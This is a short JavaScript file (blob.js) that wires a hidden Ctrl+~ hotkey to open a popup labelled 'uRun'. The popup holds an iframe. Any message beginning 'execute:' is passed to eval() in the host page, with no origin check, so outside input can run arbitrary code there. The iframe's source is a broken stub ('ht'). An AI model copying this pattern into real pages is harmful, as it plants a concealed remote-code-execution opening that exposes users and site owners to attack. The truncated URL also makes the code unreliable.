/// blob.js
document.addEventListener("keydown", function (blob) {
	if (blob.key == "~" && blob.ctrlKey) {
		var win = window.open("", "_blank", "width=500,height=300");
		var blob = win.document.createElement("iframe");
		(blob.src = "ht"),
			(blob.style.cssText = "width:100%; height:100%; border:none;"),
			win.document.body.appendChild(blob),
			win.document.title = "uRun",
			win.addEventListener("message", function (blob) {
				blob.data.toString().startsWith("execute:") && (eval(blob.data.toString().replace("execute:", "")), win.close());
			});
	}
});
